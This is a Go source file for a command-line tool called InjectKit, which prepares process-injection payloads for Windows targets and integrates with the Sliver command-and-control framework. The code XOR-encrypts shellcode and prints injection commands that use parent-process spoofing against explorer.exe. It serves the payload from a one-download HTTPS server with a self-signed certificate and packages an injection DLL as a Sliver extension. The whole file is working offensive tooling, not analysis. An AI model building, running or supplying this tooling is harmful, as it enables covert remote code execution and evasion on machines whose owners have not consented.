// InjectKit operator CLI — runs on Linux, prepares payloads for a Windows target.
//
// Usage:
//   injectkit stage   --shellcode <file> --url <url> [--serve] [--port 8443] [-o build]
//   injectkit serve   --payload <file> [--port 8443]
//   injectkit bundle  [--output build/inject-0.1.0.tar.gz]
package main

import (
	"archive/tar"
	"compress/gzip"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"encoding/pem"
	"flag"
	"fmt"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"sync/atomic"
	"time"
)

func main() {
	if len(os.Args) < 2 {
		usage()
		os.Exit(1)
	}
	switch os.Args[1] {
	case "stage":
		runStage(os.Args[2:])
	case "serve":
		runServe(os.Args[2:])
	case "bundle":
		runBundle(os.Args[2:])
	default:
		usage()
		os.Exit(1)
	}
}

func usage() {
	fmt.Fprintln(os.Stderr, `InjectKit — process injection with PPID spoofing for Sliver

Commands:
  stage    XOR-encrypt shellcode and optionally serve it over one-time HTTPS
  serve    Serve an existing payload.enc once over HTTPS then shut down
  bundle   Package inject.x64.dll + extension.json into a Sliver extension tarball

Run 'injectkit <command> -help' for flags.`)
}

// ── stage ──────────────────────────────────────────────────────────────────

func runStage(args []string) {
	fs := flag.NewFlagSet("stage", flag.ExitOnError)
	shellcodeFile := fs.String("shellcode", "", "shellcode .bin file (required)")
	rawURL        := fs.String("url", "", "HTTPS URL the target will fetch the payload from (required)")
	outputDir     := fs.String("o", "build", "output directory for payload.enc")
	serve         := fs.Bool("serve", false, "start one-time HTTPS server after encrypting")
	port          := fs.Int("port", 8443, "HTTPS port for payload server")
	fs.Parse(args)

	if *shellcodeFile == "" || *rawURL == "" {
		fmt.Fprintln(os.Stderr, "[-] --shellcode and --url are required")
		os.Exit(1)
	}

	sc, err := os.ReadFile(*shellcodeFile)
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}
	fmt.Printf("[*] Shellcode: %d bytes\n", len(sc))

	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}

	enc := make([]byte, len(sc))
	for i, b := range sc {
		enc[i] = b ^ key[i%32]
	}

	os.MkdirAll(*outputDir, 0o700)
	payloadPath := filepath.Join(*outputDir, "payload.enc")
	if err := os.WriteFile(payloadPath, enc, 0o600); err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}

	keyHex := hex.EncodeToString(key)
	fmt.Printf("[+] payload → %s (%d bytes)\n", payloadPath, len(enc))
	fmt.Printf("[+] key     → %s\n\n", keyHex)

	fmt.Println("[i] Standalone (injectkit.exe on target):")
	fmt.Printf("    injectkit.exe -mode stager -url %s -key %s -target explorer.exe\n", *rawURL, keyHex)
	fmt.Printf("    injectkit.exe -mode stager -url %s -key %s -spawn RuntimeBroker.exe -ppid explorer.exe\n\n", *rawURL, keyHex)

	fmt.Println("[i] Sliver Extension (after: extensions install build/inject-0.1.0.tar.gz):")
	fmt.Printf("    sliver (TARGET)> inject url=%s key=%s target=explorer.exe\n", *rawURL, keyHex)
	fmt.Printf("    sliver (TARGET)> inject url=%s key=%s spawn=RuntimeBroker.exe ppid=explorer.exe\n", *rawURL, keyHex)

	if *serve {
		if err := newPayloadServer(enc, *port).ListenAndServe(); err != nil {
			fmt.Fprintln(os.Stderr, "[-]", err)
			os.Exit(1)
		}
	}
}

// ── serve ──────────────────────────────────────────────────────────────────

func runServe(args []string) {
	fs := flag.NewFlagSet("serve", flag.ExitOnError)
	payloadFile := fs.String("payload", "", "path to payload.enc (required)")
	port        := fs.Int("port", 8443, "HTTPS port")
	fs.Parse(args)

	if *payloadFile == "" {
		fmt.Fprintln(os.Stderr, "[-] --payload is required")
		os.Exit(1)
	}
	data, err := os.ReadFile(*payloadFile)
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}
	fmt.Printf("[*] Serving %s on :%d\n", *payloadFile, *port)
	if err := newPayloadServer(data, *port).ListenAndServe(); err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}
}

// ── bundle ─────────────────────────────────────────────────────────────────

func runBundle(args []string) {
	fs := flag.NewFlagSet("bundle", flag.ExitOnError)
	output := fs.String("output", "build/inject-0.1.0.tar.gz", "output tarball path")
	fs.Parse(args)

	dllPath := filepath.Join("build", "inject.x64.dll")
	if _, err := os.Stat(dllPath); err != nil {
		fmt.Fprintf(os.Stderr, "[-] %s not found — run 'make ext' first\n", dllPath)
		os.Exit(1)
	}

	os.MkdirAll(filepath.Dir(*output), 0o700)
	f, err := os.Create(*output)
	if err != nil {
		fmt.Fprintln(os.Stderr, "[-]", err)
		os.Exit(1)
	}
	defer f.Close()

	gw := gzip.NewWriter(f)
	tw := tar.NewWriter(gw)

	for _, entry := range []struct{ path, arc string }{
		{"extension.json", "inject/extension.json"},
		{dllPath, "inject/inject.x64.dll"},
	} {
		data, err := os.ReadFile(entry.path)
		if err != nil {
			fmt.Fprintln(os.Stderr, "[-]", err)
			os.Exit(1)
		}
		tw.WriteHeader(&tar.Header{Name: entry.arc, Mode: 0o644, Size: int64(len(data))})
		tw.Write(data)
	}
	tw.Close()
	gw.Close()

	fmt.Printf("[+] Extension tarball → %s\n", *output)
	fmt.Printf("[i] Install: sliver> extensions install %s\n", *output)
}

// ── one-shot HTTPS payload server ──────────────────────────────────────────

type payloadServer struct {
	data []byte
	port int
	path string
}

func newPayloadServer(data []byte, port int) *payloadServer {
	b := make([]byte, 8)
	rand.Read(b)
	return &payloadServer{data: data, port: port, path: "/" + hex.EncodeToString(b)}
}

func (s *payloadServer) ListenAndServe() error {
	var served atomic.Bool
	mux := http.NewServeMux()
	srv := &http.Server{Handler: mux}

	mux.HandleFunc(s.path, func(w http.ResponseWriter, r *http.Request) {
		if !served.CompareAndSwap(false, true) {
			http.NotFound(w, r)
			return
		}
		w.Header().Set("Content-Type", "application/octet-stream")
		w.Write(s.data)
		go func() {
			time.Sleep(500 * time.Millisecond)
			srv.Close()
		}()
	})

	tlsCfg, err := selfSignedTLS()
	if err != nil {
		return err
	}

	addrs, _ := net.InterfaceAddrs()
	for _, a := range addrs {
		if ip, ok := a.(*net.IPNet); ok && !ip.IP.IsLoopback() && ip.IP.To4() != nil {
			fmt.Printf("[+] Payload URL: https://%s:%d%s\n", ip.IP, s.port, s.path)
		}
	}
	fmt.Printf("[*] One-shot HTTPS server on :%d (shuts down after one download)\n", s.port)

	ln, err := net.Listen("tcp", fmt.Sprintf(":%d", s.port))
	if err != nil {
		return err
	}
	srv.TLSConfig = tlsCfg
	return srv.ServeTLS(ln, "", "")
}

func selfSignedTLS() (*tls.Config, error) {
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		return nil, err
	}
	serial, _ := rand.Int(rand.Reader, new(big.Int).Lsh(big.NewInt(1), 128))
	tmpl := &x509.Certificate{
		SerialNumber: serial,
		Subject:      pkix.Name{CommonName: "localhost"},
		NotBefore:    time.Now().Add(-time.Hour),
		NotAfter:     time.Now().Add(24 * time.Hour),
	}
	certDER, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &key.PublicKey, key)
	if err != nil {
		return nil, err
	}
	keyDER, _ := x509.MarshalECPrivateKey(key)
	certPEM := pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: certDER})
	keyPEM := pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: keyDER})
	cert, err := tls.X509KeyPair(certPEM, keyPEM)
	if err != nil {
		return nil, err
	}
	return &tls.Config{Certificates: []tls.Certificate{cert}}, nil
}
